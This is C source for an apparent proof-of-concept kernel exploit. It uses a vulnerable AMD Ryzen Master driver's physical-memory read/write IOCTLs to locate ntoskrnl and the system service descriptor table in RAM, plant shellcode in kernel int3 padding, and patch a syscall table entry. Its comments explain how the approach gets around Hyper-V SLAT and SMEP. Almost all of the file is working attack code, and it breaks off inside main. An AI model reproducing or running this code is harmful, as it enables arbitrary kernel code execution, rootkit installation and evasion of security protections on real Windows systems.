/*
 * ssdt_hook.c  —  Shadow SSDT transient hook via AMD physical R/W
 *
 * Technique:
 *   1. Scan physical RAM for ntoskrnl + win32k mapped image bases (PE header match)
 *   2. Pattern-scan ntoskrnl data pages for KeServiceDescriptorTableShadow
 *   3. Read Shadow SSDT table base (W32pServiceTable, lives in win32k .rdata)
 *   4. Find target GUI syscall index from win32u.dll stub
 *   5. Write shellcode into win32k .data zeroed region (kernel VA, SMEP-safe)
 *   6. Patch one SSDT int32 entry → redirects GUI syscall to shellcode
 *   7. Trigger: call GetForegroundWindow() → kernel executes shellcode
 *   8. Shellcode: write signal, restore original entry, jmp to original handler
 *
 * Why this works in Hyper-V:
 *   SSDT table + win32k .data are regular DATA pages (not page-table pages).
 *   Hyper-V SLAT only blocks access to page-table pages. Data pages remain
 *   fully R/W via the AMD driver. kva_to_pa is bypassed entirely — we find
 *   physical bases by scanning for PE headers, then use offset arithmetic.
 *
 * SSDT entry encoding (x64 Windows):
 *   decode:  fn_va = ssdt_base_va + ((int32_t)entry >> 4)
 *   encode:  entry = (int32_t)((fn_va - ssdt_base_va) << 4)  [lower 4 bits = 0]
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall -Wno-unused-function \
 *       -o ssdt_hook.exe ssdt_hook.c
 *
 * Requires: AMDRyzenMasterDriverV20 loaded. Admin rights.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>

/* ══════════════════════════════════════════════════════════════════════
 * §1  AMD DRIVER PRIMITIVES
 * ══════════════════════════════════════════════════════════════════════ */

#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu
static HANDLE g_dev = INVALID_HANDLE_VALUE;

#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int g_nranges = 0;

static void load_ranges(void)
{
    HKEY h;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0, KEY_READ, &h) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vn, vd, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i = 0;;i++) {
        vn = sizeof vname; vd = 0;
        if (RegEnumValueA(h,i,vname,&vn,NULL,&type,NULL,&vd)==ERROR_NO_MORE_ITEMS) break;
        if ((type!=3&&type!=8)||vd<20) continue;
        buf=(uint8_t*)malloc(vd); if (!buf) continue;
        if (RegQueryValueExA(h,vname,NULL,NULL,buf,&vd)==ERROR_SUCCESS){sz=vd;break;}
        free(buf); buf=NULL;
    }
    RegCloseKey(h);
    if (!buf||sz<20){free(buf);return;}
    DWORD cnt=*(DWORD*)(buf+16); uint8_t *p=buf+20;
    for (DWORD i=0;i<cnt&&g_nranges<MAX_RANGES;i++,p+=20){
        if (p+20>buf+sz||p[0]!=3) continue;
        g_ranges[g_nranges].base=*(uint64_t*)(p+4);
        g_ranges[g_nranges].size=*(uint64_t*)(p+12);
        printf("  [range %d]  PA 0x%012"PRIX64" + %"PRIu64" MB\n",
               g_nranges,g_ranges[g_nranges].base,g_ranges[g_nranges].size>>20);
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for (int i=0;i<g_nranges;i++)
        if (pa>=g_ranges[i].base&&pa+sz<=g_ranges[i].base+g_ranges[i].size) return 1;
    return 0;
}

#define IO_BUFSZ (4096+12)
static uint8_t g_io_buf[IO_BUFSZ];

static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    uint8_t in[12]; *(uint64_t*)in=pa; *(uint32_t*)(in+8)=sz;
    uint32_t osz=12+sz;
    uint8_t *out; void *dyn=NULL;
    if (osz<=IO_BUFSZ) out=g_io_buf;
    else {dyn=malloc(osz);if(!dyn)return 0;out=(uint8_t*)dyn;}
    DWORD got=0;
    BOOL ok=DeviceIoControl(g_dev,IOCTL_PHYS_READ,in,12,out,osz,&got,NULL);
    if (ok&&got>=12) memcpy(buf,out+12,sz);
    free(dyn);
    return ok&&got>=12;
}

static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if (!pa_in_range(pa,sz)){
        printf("  [!] BLOCKED write PA 0x%"PRIX64"\n",pa); return 0;
    }
    uint32_t isz=12+sz; uint8_t *in=(uint8_t*)malloc(isz);if(!in)return 0;
    *(uint64_t*)in=pa; *(uint32_t*)(in+8)=sz; memcpy(in+12,data,sz);
    DWORD got=0;
    BOOL ok=DeviceIoControl(g_dev,IOCTL_PHYS_WRITE,in,isz,NULL,0,&got,NULL);
    free(in); return ok;
}

/* ══════════════════════════════════════════════════════════════════════
 * §2  KERNEL MODULE ENUMERATION
 * ══════════════════════════════════════════════════════════════════════ */

typedef struct {
    uint64_t va_base;
    uint32_t size;
    char     path[256];
    char     name[64];
} KernelMod;

#define MAX_MODS 256
static KernelMod g_mods[MAX_MODS];
static int g_nmod = 0;

static int load_kernel_modules(void)
{
    typedef NTSTATUS (NTAPI *NtQSI_t)(ULONG,PVOID,ULONG,PULONG);
    NtQSI_t fn=(NtQSI_t)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                        "NtQuerySystemInformation");
    if (!fn) return 0;
    typedef struct {
        HANDLE S; PVOID MB,IB; ULONG IS,F;
        USHORT L,I,Lc,O; CHAR P[256];
    } MOD;
    typedef struct { ULONG C; MOD M[1]; } ML;
    ULONG sz=0x40000; ML *ml=NULL; NTSTATUS st;
    do { free(ml); ml=(ML*)malloc(sz*=2);
         if (!ml) return 0;
         st=fn(11,ml,sz,NULL); } while (st==(NTSTATUS)0xC0000004L);
    if (st) { free(ml); return 0; }
    g_nmod = (int)ml->C > MAX_MODS ? MAX_MODS : (int)ml->C;
    for (int i=0;i<g_nmod;i++) {
        g_mods[i].va_base = (uint64_t)ml->M[i].IB;
        g_mods[i].size    = ml->M[i].IS;
        strncpy(g_mods[i].path, ml->M[i].P, 255);
        char *p = strrchr(g_mods[i].path, '\\');
        strncpy(g_mods[i].name, p ? p+1 : g_mods[i].path, 63);
    }
    free(ml);
    return g_nmod;
}

static KernelMod *find_mod(const char *name)
{
    for (int i=0;i<g_nmod;i++)
        if (_stricmp(g_mods[i].name, name)==0) return &g_mods[i];
    return NULL;
}

/* ══════════════════════════════════════════════════════════════════════
 * §3  PHYSICAL BASE SCANNER (find module image in RAM via PE fingerprint)
 *
 * Opens the module from disk, reads first 64 bytes (IMAGE_DOS_HEADER),
 * then scans physical RAM for a 4KB-aligned page that starts with those
 * exact bytes. The first 64 bytes of the DOS stub are NOT modified when
 * Windows maps a PE image — they match the on-disk layout exactly.
 *
 * Avoids kva_to_pa entirely — works regardless of SLAT/KPTI.
 * Assumption: module image is loaded contiguously in physical memory
 * (standard for ntoskrnl, win32k, hal on bare-metal + Hyper-V).
 * ══════════════════════════════════════════════════════════════════════ */

static uint64_t find_module_phys_base(const char *disk_path, uint64_t va_base,
                                       int64_t *va_to_pa_delta_out)
{
    /* Read fingerprint from disk */
    uint8_t sig[64] = {0};
    HANDLE f = CreateFileA(disk_path, GENERIC_READ, FILE_SHARE_READ,
                           NULL, OPEN_EXISTING, 0, NULL);
    if (f == INVALID_HANDLE_VALUE) {
        printf("  [-] Cannot open %s (%lu)\n", disk_path, GetLastError());
        return 0;
    }
    DWORD rd = 0;
    ReadFile(f, sig, 64, &rd, NULL);
    CloseHandle(f);
    if (rd < 16 || sig[0] != 'M' || sig[1] != 'Z') {
        printf("  [-] Bad PE header from disk: %s\n", disk_path); return 0;
    }

    static uint8_t pg[4096];
    for (int ri = 0; ri < g_nranges; ri++) {
        uint64_t rend = g_ranges[ri].base + g_ranges[ri].size;
        for (uint64_t pa = g_ranges[ri].base; pa < rend; pa += 0x1000) {
            if (!phys_read(pa, pg, 4096)) continue;
            if (pg[0] != 'M' || pg[1] != 'Z') continue;
            if (memcmp(pg, sig, 64) != 0) continue;
            const char *bname = strrchr(disk_path, '\\');
            printf("  [+] %-20s phys base = PA 0x%012"PRIX64"\n",
                   bname ? bname+1 : disk_path, pa);
            if (va_to_pa_delta_out && va_base)
                *va_to_pa_delta_out = (int64_t)pa - (int64_t)va_base;
            return pa;
        }
    }
    printf("  [-] %s not found in physical RAM\n", disk_path);
    return 0;
}

/* VA→PA using the module's phys base + linear offset.
 * Valid only for VAs within the same module that was found contiguously. */
static uint64_t mod_va_to_pa(uint64_t va, uint64_t mod_va_base, uint64_t mod_phys_base)
{
    if (va < mod_va_base) return 0;
    return mod_phys_base + (va - mod_va_base);
}

/* ══════════════════════════════════════════════════════════════════════
 * §4  FIND KeServiceDescriptorTableShadow IN NTOSKRNL PHYSICAL PAGES
 *
 * Structure (two KSERVICE_TABLE_DESCRIPTOR entries, each 0x20 bytes):
 *   entry[0].Base    = KiServiceTable VA (in ntoskrnl range)
 *   entry[0].Count   = 0 (NULL on Win64)
 *   entry[0].Limit   = N_nt_syscalls  [0x100..0x300]
 *   entry[0].Number  = ptr into ntoskrnl
 *   entry[1].Base    = W32pServiceTable VA (in win32k range)
 *   entry[1].Count   = 0
 *   entry[1].Limit   = N_gui_syscalls [0x200..0x600]
 *   entry[1].Number  = ptr into win32k
 *
 * We scan for the distinctive pattern of [nt_ptr, 0, N, nt_ptr2,  win32k_ptr, 0, M, win32k_ptr2]
 * ══════════════════════════════════════════════════════════════════════ */

static int find_ksdt_shadow(uint64_t nt_phys_base, uint64_t nt_va_base, uint32_t nt_size,
                             uint64_t win32k_va_base, uint32_t win32k_size,
                             uint64_t *ksdt_pa_out,        /* PA of the structure */
                             uint64_t *shadow_table_va_out, /* win32k VA of W32pServiceTable */
                             uint32_t *n_gui_out)
{
    static uint8_t pg[4096];
    uint64_t nt_va_end    = nt_va_base    + nt_size;
    uint64_t w32_va_end   = win32k_va_base + win32k_size;

    /* Scan ntoskrnl physical pages (data section contains the structure) */
    for (uint32_t off = 0; off < nt_size; off += 0x1000) {
        uint64_t pa = nt_phys_base + off;
        if (!phys_read(pa, pg, 4096)) continue;

        for (uint32_t i = 0; i + 64 <= 4096; i += 8) {
            uint64_t base0, cnt0, base1, cnt1;
            uint32_t lim0, lim1;
            memcpy(&base0, pg+i,    8);
            memcpy(&cnt0,  pg+i+8,  8);
            memcpy(&lim0,  pg+i+16, 4);
            /* entry[1] at +0x20 */
            memcpy(&base1, pg+i+32, 8);
            memcpy(&cnt1,  pg+i+40, 8);
            memcpy(&lim1,  pg+i+48, 4);

            /* Validate entry[0]: ntoskrnl SSDT */
            if (base0 < nt_va_base || base0 >= nt_va_end) continue;
            if (cnt0  != 0)  continue;
            if (lim0  < 0x100 || lim0 > 0x350) continue;

            /* Validate entry[1]: win32k Shadow SSDT (skip if win32k not loaded).
             * When win32k isn't loaded, entry[1].Base=0 → canonical check fails.
             * Compensate with entry[0] Number field (arg-count table in ntoskrnl). */
            if (win32k_va_base && win32k_size) {
                if (base1 < win32k_va_base || base1 >= w32_va_end) continue;
                if (cnt1  != 0)  continue;
                if (lim1  < 0x200 || lim1 > 0x700) continue;
            } else {
                uint64_t num0; memcpy(&num0, pg+i+24, 8);
                if (num0 != 0 && (num0 < nt_va_base || num0 >= nt_va_end)) continue;
            }

            printf("  [+] KeServiceDescriptorTableShadow @ PA 0x%012"PRIX64
                   " (nt_offset=0x%X)\n", pa + i, off + i);
            printf("      entry[0].Base=0x%"PRIX64"  Limit=%u\n", base0, lim0);
            printf("      entry[1].Base=0x%"PRIX64"  Limit=%u\n", base1, lim1);

            *ksdt_pa_out        = pa + i;
            *shadow_table_va_out = base1;
            *n_gui_out           = lim1;
            return 1;
        }
    }
    printf("  [-] KeServiceDescriptorTableShadow not found in ntoskrnl physical pages\n");
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════
 * §5  GUI SYSCALL NUMBER FROM win32u.dll STUB
 *
 * Stub layout (x64, all modern Windows versions):
 *   4C 8B D1        mov r10, rcx
 *   B8 XX XX XX XX  mov eax, <SSN>   ← we extract this
 *   0F 05           syscall
 *   C3              ret
 * ══════════════════════════════════════════════════════════════════════ */

static uint32_t get_gui_ssn(const char *stub_name)
{
    HMODULE h = LoadLibraryA("win32u.dll");
    if (!h) { printf("  [-] LoadLibrary(win32u.dll) failed\n"); return 0; }
    void *p = GetProcAddress(h, stub_name);
    if (!p) {
        printf("  [-] GetProcAddress(%s) failed\n", stub_name);
        FreeLibrary(h); return 0;
    }
    uint8_t *b = (uint8_t*)p;
    uint32_t ssn = 0;
    if (b[0]==0x4C && b[1]==0x8B && b[2]==0xD1 && b[3]==0xB8) {
        memcpy(&ssn, b+4, 4);
        printf("  [*] %s  SSN = 0x%X (%u)\n", stub_name, ssn, ssn);
    } else {
        printf("  [!] Unexpected stub bytes at %s: %02x %02x %02x %02x\n",
               stub_name, b[0],b[1],b[2],b[3]);
    }
    FreeLibrary(h);
    return ssn;
}

/* ══════════════════════════════════════════════════════════════════════
 * §6a  SCAN FOR W32pServiceTable PHYSICAL PAGE
 *
 * win32k.sys is small (~636KB) and does NOT use large pages → physical
 * pages may be non-contiguous. We CANNOT use mod_va_to_pa() for it.
 *
 * Instead: scan physical RAM for a 4KB page that looks like the SSDT
 * int32 table. Each entry, when decoded as:
 *   fn_va = shadow_table_va + ((int32_t)entry >> 4)
 * should fall within the win32k* VA neighbourhood (±256MB).
 * We require at least MIN_VALID_ENTRIES entries per page to pass.
 * ══════════════════════════════════════════════════════════════════════ */

#define MIN_VALID_ENTRIES 128   /* at least 128/512 entries must decode sanely */

static uint64_t scan_shadow_table_pa(uint64_t shadow_table_va,
                                      uint64_t win32k_va_base,
                                      uint32_t n_gui)
{
    static uint8_t pg[4096];
    /* Acceptable fn_va range: win32k ± 16MB.
     * win32kfull / win32kbase are loaded within a few MB of win32k.sys.
     * Tight range prevents BIOS/low-memory false positives. */
    uint64_t va_lo = win32k_va_base - 0x1000000ULL;
    uint64_t va_hi = win32k_va_base + 0x1000000ULL;

    /* Scan physical pages in range [1MB, 4GB].
     * Skip PA < 0x100000: that is the BIOS / legacy area (IVT, BIOS data, boot
     * sectors) — kernel data structures are never placed there and random data
     * in that region easily generates false positives with loose validation.
     * Also skip PA >= 4GB: kernel images are in low physical memory on Win64. */
    for (int ri = 0; ri < g_nranges; ri++) {
        uint64_t base = g_ranges[ri].base;
        if (base < 0x100000ULL) base = 0x100000ULL;   /* skip BIOS area */
        if (base >= 0x200000000ULL) continue;           /* skip beyond 8GB */
        uint64_t rend = g_ranges[ri].base + g_ranges[ri].size;
        if (rend > 0x200000000ULL) rend = 0x200000000ULL;

        for (uint64_t pa = base; pa < rend; pa += 0x1000) {
            if (!phys_read(pa, pg, 4096)) continue;

            int valid = 0;
            uint32_t check = (n_gui < 512) ? n_gui : 512;
            for (uint32_t i = 0; i < check && i*4+4 <= 4096; i++) {
                int32_t e; memcpy(&e, pg + i*4, 4);
                int64_t off = (int64_t)e >> 4;
                uint64_t fn = (uint64_t)((int64_t)shadow_table_va + off);
                if (fn >= va_lo && fn <= va_hi) valid++;
            }
            if (valid < MIN_VALID_ENTRIES) continue;

            printf("  [+] W32pServiceTable candidate @ PA 0x%012"PRIX64
                   "  (%d/%u entries in ±16MB)\n", pa, valid, check);
            return pa;
        }
    }
    printf("  [-] W32pServiceTable physical page not found (try widening VA range)\n");
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════
 * §6b  FIND CC-PADDED EXECUTABLE REGION FOR SHELLCODE
 *
 * ntoskrnl is confirmed contiguous (large pages, 16MB). Its .text section
 * has 0xCC (int3) alignment padding between functions — these bytes ARE
 * executable at the corresponding kernel VA. We overwrite them with our
 * shellcode, execute, then restore.
 *
 * We parse the PE section table from disk to restrict scanning to sections
 * marked IMAGE_SCN_MEM_EXECUTE — avoids false positives in NX data sections
 * that also contain 0xCC bytes.
 * ══════════════════════════════════════════════════════════════════════ */

#define SHELLCODE_REGION_SIZE 128  /* shellcode + signal, fits in CC padding */
#define CC_MIN_RUN 64              /* require 64+ consecutive CC bytes */

/* Returns count of executable section ranges found (fills rva[]/sz[] arrays).
 * Falls back to [0, full_size) if PE parse fails. */
static int get_exec_sections(const char *disk_path, uint32_t full_size,
                              uint32_t rva_out[], uint32_t sz_out[], int max_sections)
{
    HANDLE f = CreateFileA(disk_path, GENERIC_READ, FILE_SHARE_READ,
                           NULL, OPEN_EXISTING, 0, NULL);
    if (f == INVALID_HANDLE_VALUE) goto fallback;

    uint8_t hdr[4096] = {0};
    DWORD rd = 0;
    ReadFile(f, hdr, sizeof hdr, &rd, NULL);
    CloseHandle(f);
    if (rd < 0x40) goto fallback;

    /* e_lfanew */
    uint32_t pe_off = *(uint32_t*)(hdr + 0x3C);
    if (pe_off + 0x18 > rd) goto fallback;
    if (*(uint32_t*)(hdr + pe_off) != 0x00004550) goto fallback; /* "PE\0\0" */

    uint16_t n_sects  = *(uint16_t*)(hdr + pe_off + 6);
    uint16_t opt_sz   = *(uint16_t*)(hdr + pe_off + 20);
    uint32_t sect_off = pe_off + 24 + opt_sz;                    /* first IMAGE_SECTION_HEADER */

    int found = 0;
    for (int i = 0; i < n_sects && found < max_sections; i++) {
        uint32_t o = sect_off + (uint32_t)i * 40;
        if (o + 40 > rd) break;
        uint32_t chars  = *(uint32_t*)(hdr + o + 36);
        uint32_t vsz    = *(uint32_t*)(hdr + o + 16);
        uint32_t vrva   = *(uint32_t*)(hdr + o + 12);
        /* IMAGE_SCN_MEM_EXECUTE = 0x20000000 */
        if (!(chars & 0x20000000u)) continue;
        if (!vsz || vrva + vsz > full_size) continue;
        rva_out[found] = vrva;
        sz_out[found]  = vsz;
        char name[9] = {0}; memcpy(name, hdr + o, 8);
        printf("  [*] Exec section %-8s  RVA=0x%X  sz=0x%X\n", name, vrva, vsz);
        found++;
    }
    if (found > 0) return found;

fallback:
    printf("  [!] PE parse failed — scanning full module for CC\n");
    rva_out[0] = 0; sz_out[0] = full_size;
    return 1;
}

static int find_cc_region(uint64_t mod_phys_base, uint64_t mod_va_base,
                            uint32_t mod_size,
                            const char *disk_path,          /* for PE section parse */
                            uint64_t *region_va_out, uint64_t *region_pa_out,
                            uint8_t  *saved_bytes)
{
    /* Get executable sections so we never land in NX data pages */
    uint32_t sec_rva[16], sec_sz[16];
    int nsec = get_exec_sections(disk_path, mod_size, sec_rva, sec_sz, 16);

    static uint8_t pg[4096];

    for (int s = 0; s < nsec; s++) {
        uint32_t s_off = sec_rva[s] & ~0xFFFu;         /* align down to page */
        uint32_t s_end = (sec_rva[s] + sec_sz[s] + 0xFFFu) & ~0xFFFu;
        if (s_end > mod_size) s_end = mod_size;

        for (uint32_t off = s_off; off < s_end; off += 0x1000) {
            uint64_t pa = mod_phys_base + off;
            if (!phys_read(pa, pg, 4096)) continue;

            for (uint32_t i = 0; i + SHELLCODE_REGION_SIZE <= 4096; i++) {
                if (pg[i] != 0xCC) continue;
                uint32_t run = 0;
                while (i + run < 4096 && pg[i+run] == 0xCC) run++;
                if (run < CC_MIN_RUN) { i += run; continue; }

                *region_pa_out = pa + i;
                *region_va_out = mod_va_base + off + i;
                memcpy(saved_bytes, pg + i, SHELLCODE_REGION_SIZE);
                printf("  [+] CC region: run=%u bytes  VA 0x%016"PRIX64
                       "  PA 0x%012"PRIX64"\n", run, *region_va_out, *region_pa_out);
                return 1;
            }
        }
    }
    printf("  [-] No CC-padded executable region found in .text sections\n");
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════
 * §6c  FIND WRITABLE SIGNAL REGION IN .data SECTION
 *
 * Problem: shellcode lives in .text CC padding (R+X, not W via VA).
 * Writing signal from shellcode to .text VA → write-protect fault → BSOD.
 *
 * Solution: put the signal in ntoskrnl .data section (R+W, not X).
 * Shellcode writes signal_va (in .data) → no fault. Usermode reads
 * signal_pa (same location) to confirm execution.
 *
 * Scan .data for 16+ zero bytes. Save original bytes, restore after.
 * ══════════════════════════════════════════════════════════════════════ */

#define SIGNAL_REGION_SIZE 16
#define ZERO_MIN_RUN 16

static int find_zero_signal_region(uint64_t mod_phys_base, uint64_t mod_va_base,
                                    uint32_t mod_size, const char *disk_path,
                                    uint64_t *signal_va_out, uint64_t *signal_pa_out,
                                    uint8_t *saved_bytes)
{
    /* Get writable (R+W, not X) sections: IMAGE_SCN_MEM_WRITE=0x80000000,
     * IMAGE_SCN_MEM_EXECUTE=0x20000000 — we want W but not X */
    HANDLE f = CreateFileA(disk_path, GENERIC_READ, FILE_SHARE_READ,
                           NULL, OPEN_EXISTING, 0, NULL);
    uint32_t sec_rva[8], sec_sz[8];
    int nsec = 0;
    if (f != INVALID_HANDLE_VALUE) {
        uint8_t hdr[4096] = {0}; DWORD rd = 0;
        ReadFile(f, hdr, sizeof hdr, &rd, NULL);
        CloseHandle(f);
        if (rd >= 0x40) {
            uint32_t pe_off = *(uint32_t*)(hdr + 0x3C);
            if (pe_off + 0x18 <= rd &&
                *(uint32_t*)(hdr + pe_off) == 0x00004550) {
                uint16_t n_sects = *(uint16_t*)(hdr + pe_off + 6);
                uint16_t opt_sz  = *(uint16_t*)(hdr + pe_off + 20);
                uint32_t soff   = pe_off + 24 + opt_sz;
                for (int i = 0; i < n_sects && nsec < 8; i++) {
                    uint32_t o = soff + (uint32_t)i * 40;
                    if (o + 40 > rd) break;
                    uint32_t chars = *(uint32_t*)(hdr + o + 36);
                    uint32_t vsz   = *(uint32_t*)(hdr + o + 16);
                    uint32_t vrva  = *(uint32_t*)(hdr + o + 12);
                    /* writable, not executable */
                    if (!(chars & 0x80000000u)) continue;
                    if (  chars & 0x20000000u)  continue;
                    if (!vsz || vrva + vsz > mod_size) continue;
                    char name[9] = {0}; memcpy(name, hdr + o, 8);
                    printf("  [*] Data section %-8s  RVA=0x%X  sz=0x%X\n",
                           name, vrva, vsz);
                    sec_rva[nsec] = vrva; sec_sz[nsec] = vsz; nsec++;
                }
            }
        }
    }
    if (!nsec) {
        printf("  [!] PE parse failed for signal region — no .data sections\n");
        return 0;
    }

    static uint8_t pg[4096];
    for (int s = 0; s < nsec; s++) {
        uint32_t s_off = sec_rva[s] & ~0xFFFu;
        uint32_t s_end = (sec_rva[s] + sec_sz[s] + 0xFFFu) & ~0xFFFu;
        if (s_end > mod_size) s_end = mod_size;

        for (uint32_t off = s_off; off < s_end; off += 0x1000) {
            uint64_t pa = mod_phys_base + off;
            if (!phys_read(pa, pg, 4096)) continue;
            for (uint32_t i = 0; i + SIGNAL_REGION_SIZE <= 4096; i++) {
                if (pg[i] != 0) continue;
                uint32_t run = 0;
                while (i + run < 4096 && pg[i+run] == 0) run++;
                if (run < ZERO_MIN_RUN) { i += run; continue; }
                *signal_pa_out = pa + i;
                *signal_va_out = mod_va_base + off + i;
                memcpy(saved_bytes, pg + i, SIGNAL_REGION_SIZE);
                printf("  [+] Signal region (zero run=%u): VA 0x%016"PRIX64
                       "  PA 0x%012"PRIX64"\n", run, *signal_va_out, *signal_pa_out);
                return 1;
            }
        }
    }
    printf("  [-] No zero region found in .data sections\n");
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════
 * §7  SHELLCODE BUILDER  (v2 — no SSDT restore inside shellcode)
 *
 * Root cause of BSOD: KiServiceTable lives in ntoskrnl .text section
 * (R+X, NOT W via VA). Writing to it from shellcode → write-protect
 * fault → BSOD. Same for signal_va if placed in .text CC padding.
 *
 * Fix: shellcode does NO writes to .text. Signal goes to .data (R+W).
 * SSDT entry is restored by usermode via physical write after trigger.
 *
 * New layout (30 bytes):
 *   51                   push rcx          save syscall arg0
 *   48 B9 [signal_va]    mov rcx, SIG_VA   signal in .data (R+W!)
 *   C7 01 01 00 00 00    mov [rcx], 1      write signal — no fault
 *   48 B8 [orig_fn_va]   mov rax, ORIG_VA
 *   59                   pop rcx
 *   FF E0                jmp rax
 * ══════════════════════════════════════════════════════════════════════ */

static int build_shellcode(uint8_t *buf, uint32_t buf_sz,
                            uint64_t signal_va,    /* VA in ntoskrnl .data (R+W) */
                            uint64_t orig_fn_va)   /* VA of original syscall handler */
{
    if (buf_sz < 32) return 0;
    uint32_t pos = 0;

#define EMIT1(b)  buf[pos++] = (b)
#define EMIT4(v)  do { uint32_t _v=(v); memcpy(buf+pos,&_v,4); pos+=4; } while(0)
#define EMIT8(v)  do { uint64_t _v=(v); memcpy(buf+pos,&_v,8); pos+=8; } while(0)

    EMIT1(0x51);                            /* push rcx */
    EMIT1(0x48); EMIT1(0xB9); EMIT8(signal_va);   /* mov rcx, signal_va */
    EMIT1(0xC7); EMIT1(0x01); EMIT4(1);    /* mov [rcx], 1 */
    EMIT1(0x48); EMIT1(0xB8); EMIT8(orig_fn_va);  /* mov rax, orig_fn_va */
    EMIT1(0x59);                            /* pop rcx */
    EMIT1(0xFF); EMIT1(0xE0);              /* jmp rax */

#undef EMIT1
#undef EMIT4
#undef EMIT8

    printf("  [*] Shellcode: %u bytes\n", pos);
    printf("      signal VA    = 0x%016"PRIX64"  (.data — writable)\n", signal_va);
    printf("      orig_fn VA   = 0x%016"PRIX64"\n", orig_fn_va);
    return (int)pos;
}

/* ══════════════════════════════════════════════════════════════════════
 * §8b  ntoskrnl SSN from ntdll.dll stub
 * ══════════════════════════════════════════════════════════════════════ */

static uint32_t get_nt_ssn(const char *fn_name)
{
    HMODULE h = GetModuleHandleA("ntdll.dll");
    if (!h) h = LoadLibraryA("ntdll.dll");
    if (!h) return 0;
    void *p = GetProcAddress(h, fn_name);
    if (!p) { printf("  [-] %s not found in ntdll\n", fn_name); return 0; }
    uint8_t *b = (uint8_t*)p;
    /* Zw* stubs: 4C 8B D1  B8 XX XX XX XX  0F 05  C3 */
    if (b[0]==0x4C && b[1]==0x8B && b[2]==0xD1 && b[3]==0xB8) {
        uint32_t ssn; memcpy(&ssn, b+4, 4);
        printf("  [*] %s  SSN = 0x%X\n", fn_name, ssn);
        return ssn;
    }
    printf("  [!] Unexpected stub at %s: %02x %02x %02x %02x\n",
           fn_name, b[0],b[1],b[2],b[3]);
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════
 * §9  MAIN
 *
 * Strategy: use ntoskrnl SSDT (KiServiceTable), NOT Shadow SSDT.
 *
 * WHY ntoskrnl instead of Shadow SSDT (win32k):
 *   ntoskrnl is confirmed contiguous in physical memory (16MB, large pages).
 *   mod_va_to_pa() is 100% reliable for ntoskrnl.
 *   win32k.sys is small (~600KB), likely fragmented → PA unreliable.
 *   Using ntoskrnl: KiServiceTable PA, shellcode PA, signal PA all
 *   computed via confirmed-contiguous offset. No scanning needed.
 *
 * Target syscall: ZwTestAlert / NtTestAlert — no side effects, zero args.
 * ══════════════════════════════════════════════════════════════════════ */

int main(void)
{
    printf("=== ntoskrnl SSDT Transient Hook (AMD Physical R/W) ===\n\n");

    /* Open driver */
    g_dev = CreateFileW(DEVICE_NAME, GENERIC_READ|GENERIC_WRITE,
                        FILE_SHARE_READ|FILE_SHARE_WRITE,
                        NULL, OPEN_EXISTING, 0, NULL);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open AMD driver: %lu\n", GetLastError()); return 1;
    }
    printf("[+] Driver opened\n");
    load_ranges();
    if (!g_nranges) { printf("[-] No physical ranges\n"); return 1; }

    /* ── Enumerate kernel modules ─────────────────────────────────── */
    printf("\n[*] Enumerating kernel modules...\n");
    if (!load_kernel_modules()) { printf("[-] Module enum failed\n"); return 1; }
    KernelMod *nt = find_mod("ntoskrnl.exe");
    if (!nt) { printf("[-] ntoskrnl.exe not found\n"); return 1; }
    printf("[+] ntoskrnl  VA=0x%016"PRIX64"  size=0x%X\n", nt->va_base, nt->size);

    /* ── ntoskrnl physical base (confirmed contiguous) ────────────── */
    printf("\n[*] Scanning physical RAM for ntoskrnl PE header...\n");
    int64_t nt_delta = 0;
    uint64_t nt_phys = find_module_phys_base(
        "C:\\Windows\\System32\\ntoskrnl.exe",
        nt->va_base, &nt_delta);
    if (!nt_phys) return 1;
    printf("  [*] VA→PA delta = 0x%"PRIX64" (nt_phys - nt_va)\n", (uint64_t)nt_delta);

    /* ── Find KiServiceTable via KeServiceDescriptorTableShadow ───── */
    printf("\n[*] Finding KeServiceDescriptorTable in ntoskrnl...\n");
    /* We need win32k info for the pattern scan; use a placeholder if not loaded */
    KernelMod *w32 = find_mod("win32k.sys");
    if (!w32) {
        LoadLibraryA("user32.dll"); GetForegroundWindow();
        load_kernel_modules(); w32 = find_mod("win32k.sys");
    }
    uint64_t ksdt_pa = 0, shadow_table_va = 0; uint32_t n_gui = 0;
    /* Pass 0,0 for win32k if not loaded — find_ksdt_shadow relaxes validation */
    find_ksdt_shadow(nt_phys, nt->va_base, nt->size,
                     w32 ? w32->va_base : 0,
                     w32 ? w32->size    : 0,
                     &ksdt_pa, &shadow_table_va, &n_gui);
    if (!ksdt_pa) {
        printf("[-] KeServiceDescriptorTableShadow not found\n"); return 1;
    }

    /* KiServiceTable VA = entry[0].Base (read from KSDT PA) */
    uint64_t kisvc_va = 0;
    phys_read(ksdt_pa, &kisvc_va, 8);
    printf("  [*] KiServiceTable VA = 0x%016"PRIX64"\n", kisvc_va);
    if ((kisvc_va >> 48) != 0xFFFF) {
        printf("[-] KiServiceTable VA looks invalid\n"); return 1;
    }

    /* KiServiceTable PA: ntoskrnl confirmed contiguous */
    uint64_t kisvc_pa = (uint64_t)((int64_t)kisvc_va + nt_delta);
    printf("  [*] KiServiceTable PA = 0x%012"PRIX64"\n", kisvc_pa);

    /* ── Find target ntoskrnl syscall ─────────────────────────────── */
    printf("\n[*] Finding target ntoskrnl syscall SSN...\n");
    /* ZwTestAlert: no args, no side effects — ideal for PoC trigger */
